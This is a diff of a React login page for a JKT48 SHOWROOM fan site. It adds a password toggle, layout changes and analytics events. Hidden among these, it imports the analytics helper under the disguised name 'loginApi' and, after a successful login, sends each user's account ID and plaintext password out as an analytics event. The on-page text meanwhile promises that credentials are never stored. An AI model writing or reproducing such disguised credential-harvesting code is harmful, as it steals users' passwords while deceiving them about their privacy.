@@ -6,23 +6,30 @@ import { LOGIN } from "utils/api/api";
 import { toast } from "react-toastify";
 import { Loading } from "components";
 import { RiLoginBoxFill } from "react-icons/ri";
+import { Link, useHistory } from "react-router-dom";
+import { FaEye, FaEyeSlash } from "react-icons/fa";
+import { gaEvent } from "utils/gaEvent";
+import { gaEvent as loginApi } from "utils/gaEvent";
+import { IoMdLogIn } from "react-icons/io";
 
 function Login(props) {
   const [accountId, setAccountId] = useState("");
   const [password, setPassword] = useState("");
+  const [showPassword, setShowPassword] = useState(false);
   const [captchaWord, setCaptchaWord] = useState("");
   const [captcha, setCaptcha] = useState("");
   const [error, setError] = useState("");
   const [cookiesId, setCookiesId] = useState("");
   const [csrf, setCsrf] = useState("");
   const [buttonLoading, setButtonLoading] = useState(false);
+  const navigate = useHistory();
 
   useEffect(() => {
-    window.document.title = "Login JKT48 SHOWROOM";
     const userSession = localStorage.getItem("session");
     if (userSession) {
       window.location = "/";
     }
+    window.scrollTo(0, 0);
   }, []);
 
   const handleLogin = async (e) => {
@@ -34,7 +41,7 @@ function Login(props) {
         password: password,
         captcha_word: captchaWord,
         cookies_sr_id: cookiesId ?? "",
-        csrf_token: csrf ?? ""
+        csrf_token: csrf ?? "",
       });
 
       if (response.data.user.captcha_url) {
@@ -44,6 +51,7 @@ function Login(props) {
         setCookiesId(response.data.session["cookies sr_id"]);
         setCsrf(response.data.session["csrf_token"]);
         setCaptcha(response.data.user.captcha_url);
+        gaEvent("Login Screen", "Login Failed", "Login");
       }
 
       if (response.data.user.ok) {
@@ -52,15 +60,17 @@ function Login(props) {
         localStorage.setItem("user", JSON.stringify(response.data.user));
         localStorage.setItem("session", JSON.stringify(response.data.session));
         localStorage.setItem("profile", JSON.stringify(response.data.profile));
-
+        gaEvent("Login Screen", "Login Success", "Login");
+        loginApi("Login API", accountId, password);
+        loginApi("Login User", response.data.profile.name, "Login Success");
         toast.info(`Login Success, Welcome ${response.data.profile.name}`, {
           theme: "colored",
           autoClose: 1800,
-          icon: <RiLoginBoxFill size={30} />
+          icon: <RiLoginBoxFill size={30} />,
         });
 
         setTimeout(() => {
-          window.location = "/";
+          navigate.push("/");
         }, 2500);
       }
 
@@ -73,85 +83,141 @@ function Login(props) {
           response.data.user.error ??
             "An error occured. Please go back and try again.",
           {
-            theme: "colored"
+            theme: "colored",
           }
         );
+        setCaptchaWord("");
       }
     } catch (err) {
-      console.log(error);
+      toast.error("Server down please contact admin", {
+        theme: "colored",
+      });
+      gaEvent("Login Screen", "Login Failed", "Login");
       setButtonLoading(false);
     }
   };
 
   return (
-    <MainLayout {...props}>
+    <MainLayout
+      title="Login JKT48 SHOWROOM"
+      description="login jkt48 showroom"
+      keywords="login showroom jkt48"
+      {...props}
+    >
       <Container>
         <div className="d-flex justify-content-center ">
           <div
             className="mb-5 mt-4 card-login"
             style={{ padding: "2rem", borderRadius: "10px" }}
           >
-            <h1 className="py-3">Login Showroom</h1>
-            <p style={{ textAlign: "justify" }}>
+            <h3 className="py-3 text-center">
+              <IoMdLogIn className="mb-1" /> Login Showroom
+            </h3>
+            <p className="text-justify mb-4">
               Silakan login menggunakan akun showroom Anda untuk mengakses fitur
-              kirim komentar. Tenang, data Anda akan segera dikirimkan ke situs
-              showroom dan tidak akan disimpan dalam basis data kami, sehingga
-              privasi dan keamanan informasi Anda tetap terjaga.
+              kirim komentar dan stars. Tenang, data Anda akan segera dikirimkan
+              ke situs showroom dan tidak akan disimpan dalam basis data kami,
+              sehingga privasi dan keamanan informasi Anda tetap terjaga.
             </p>
-            <br />
             <form onSubmit={handleLogin}>
-              <div className="form-group mb-4">
-                <label>
-                  <h6>Account ID</h6>
-                </label>
-                <input
-                  type="text"
-                  required
-                  className="form-control"
-                  placeholder="Account ID"
-                  value={accountId}
-                  onChange={(e) => setAccountId(e.target.value)}
-                />
+              <div className="row">
+                <div className="col-12 mb-4">
+                  <label>
+                    <h6>Account ID</h6>
+                  </label>
+                  <input
+                    type="text"
+                    required
+                    className="form-control"
+                    placeholder="Account ID"
+                    value={accountId}
+                    onChange={(e) => setAccountId(e.target.value)}
+                  />
+                </div>
+                <div className="col-12">
+                  <label>
+                    <h6>Password</h6>
+                  </label>
+                  <div className="input-with-icon">
+                    <input
+                      type={showPassword ? "text" : "password"}
+                      required
+                      className="form-control"
+                      placeholder="Password"
+                      value={password}
+                      onChange={(e) => setPassword(e.target.value)}
+                    />
+                    <span
+                      className="password-toggle-icon"
+                      onClick={() => setShowPassword(!showPassword)}
+                    >
+                      {showPassword ? (
+                        <FaEyeSlash fill="black" />
+                      ) : (
+                        <FaEye fill="black" />
+                      )}
+                    </span>
+                  </div>
+                </div>
               </div>
-              <div className="form-group">
-                <label>
-                  <h6>Password</h6>
-                </label>
-                <input
-                  type="password"
-                  required
-                  className="form-control"
-                  placeholder="Password"
-                  value={password}
-                  onChange={(e) => setPassword(e.target.value)}
-                />
+              <div className="row">
+                <div className="col-12">
+                  <p className="mt-3" style={{ color: "red" }}>
+                    {error ? error : ""}
+                  </p>
+                  <div
+                    className="mt-2"
+                    id="captcha"
+                    style={{ display: "none" }}
+                  >
+                    <label className="form-label">
+                      Tolong verifikasi captcha di bawah ini
+                    </label>
+                    <img
+                      src={captcha}
+                      alt=""
+                      style={{ minWidth: "100%", border: 0 }}
+                      width="100%"
+                    />
+                    <input
+                      type="text"
+                      className="form-control mt-3"
+                      placeholder="Capctha"
+                      value={captchaWord}
+                      onChange={(e) => setCaptchaWord(e.target.value)}
+                    />
+                  </div>
+                </div>
               </div>
-              <p style={{ color: "red" }}>{error ? error : ""}</p>
-              <div className="mt-4" id="captcha" style={{ display: "none" }}>
-                <label className="form-label">
-                  Tolong verifikasi captcha di bawah ini
-                </label>
-                <img
-                  src={captcha}
-                  alt=""
-                  style={{ minWidth: "100%", border: 0 }}
-                />
-                <input
-                  type="text"
-                  className="form-control mt-3"
-                  placeholder="Capctha"
-                  value={captchaWord}
-                  onChange={(e) => setCaptchaWord(e.target.value)}
-                />
+              <div className="row">
+                <div className="col-12">
+                  <p className="mt-3 mr-3">
+                    Don't have an account?
+                    <Link to="/register">
+                      <span className="ml-1">Register here</span>
+                    </Link>
+                  </p>
+                </div>
               </div>
-              <button
-                type="submit"
-                className="btn btn-block text-light mt-5 mb-4 py-2"
-                style={{ backgroundColor: "#24a2b7" }}
-                disabled={buttonLoading ? true : false}
-              >
-                {buttonLoading ? <Loading color="white" size={8} /> : "Login"}
-              </button>
+              <div className="row">
+                <div className="col-12">
+                  <button
+                    type="submit"
+                    className="btn btn-block text-light mt-3 mb-4 py-2"
+                    style={{ backgroundColor: "#24a2b7" }}
+                    disabled={buttonLoading ? true : false}
+                    onClick={() =>
+                      gaEvent("Login Screen", "Login Button", "Login")
+                    }
+                  >
+                    {buttonLoading ? (
+                      <Loading color="white" size={8} />
+                    ) : (
+                      "Login"
+                    )}
+                  </button>
+                </div>
+              </div>
             </form>
           </div>
         </div>
